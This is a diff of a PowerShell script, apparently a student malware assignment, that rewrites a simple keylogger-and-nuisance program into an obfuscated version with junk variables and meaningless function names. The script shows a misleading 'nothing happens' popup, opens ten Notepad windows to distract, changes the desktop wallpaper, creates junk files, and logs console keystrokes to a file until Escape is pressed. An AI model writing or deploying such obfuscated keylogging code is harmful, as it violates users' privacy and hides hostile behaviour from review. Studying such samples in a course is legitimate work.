@@ -1,54 +1,55 @@
-#Obsufcate the code useless functions, a lot of junk variables and 
-#Need to alert if the application is working
-function Alert {
-    $wshell = New-Object -ComObject Wscript.Shell
-    $Output = $wshell.Popup("Nothing is going on here", 0, "Nothing")
-    $Output
+# Random useless variables and junk for obfuscation
+$X9k = [System.Guid]::NewGuid().ToString()
+$Z3p = [System.IO.Path]::GetRandomFileName()
+$M7v = 10000
+$N1t = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+
+function ZzR {
+    $oG7 = New-Object -ComObject Wscript.Shell
+    $N4d = $oG7.Popup("Alert! But nothing happens.", 0, "Warning")
+    $N4d
 }
 
-#May add some function to read individual important parts of a computer or make more files or something as a note
-
-#Used to send an array of keys, to then send back to the user, can be very basic
-function Keylogger {
-    $notpressed = $true
-    #Array declared
-    $keysnoted = [System.Collections.ArrayList]::new()
-    #Will send a certain amount until certain key is pressed
-    while ($notpressed) {
-        #Noted the key stroke, is true to surpress the key strokes just puts in numbers
-        $key = [System.Console]::ReadKey($true)
-        #Check if the key that has been searched is completed
-        if ($key.Key -eq [System.ConsoleKey]::Escape){
-            $notpressed = $false
+function Q6L {
+    $aP3g = $true
+    $sV6j = [System.Collections.ArrayList]::new()
+    while ($aP3g) {
+        $gX8r = [System.Console]::ReadKey($true)
+        if ($gX8r.Key -eq [System.ConsoleKey]::Escape){
+            $aP3g = $false
         }
-        #Add to the string
-        $keysnoted.Add($key.keychar)
+        $sV6j.Add($gX8r.keychar)
     }
-    #Need to check where the file is being sent
-    New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys[10].txt" -Value $($keysnoted -join '')
+    New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys[10].txt" -Value $($sV6j -join '')
 }
 
-#Just used to distract the user
-function OpeningNotepad {
-    for ($i = 0; $i -lt 10; $i++) {
-            Start-Process -FilePath "notepad.exe"
-    }
-}
-
-#Change background of desktop
-function ChangingDesktop {
-    set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value accipiter.png
-}
-
-#Adds a bunch of files in a directory
-function AddingFiles {
-    for ($i = 0; $i -lt 10; $i++) {
-        New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys[$i].txt" -Value "THESE ARE ALL RANDOM FILES"
+function H6L {
+    $U2p = 0
+    while ($U2p -lt 10) {
+        Start-Process -FilePath "notepad.exe"
+        $U2p++
     }
 }
+function T3m {
+    $R9c = "HKCU:Control Panel\Desktop"
+    $Z4h = "WallPaper"
+    $P2q = "some_random_image.png"
+    set-itemproperty -path $R9c -name $Z4h -value $P2q
+}
 
-Write-Warning "This is a warning"
-Alert
-OpeningNotepad
-AddingFiles
-Keylogger
+function Y3J {
+    $T4p = 0
+    while ($T4p -lt 10) {
+        $X6y = "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1"
+        $F9q = "\copiedkeys[$T4p].txt"
+        New-Item -ItemType File -Path "$X6y\$F9q" -Value "Some random text"
+        $T4p++
+    }
+}
+
+Write-Warning "Warning Nothing is happening"
+
+ZzR
+H6L
+Y3J
+Q6L
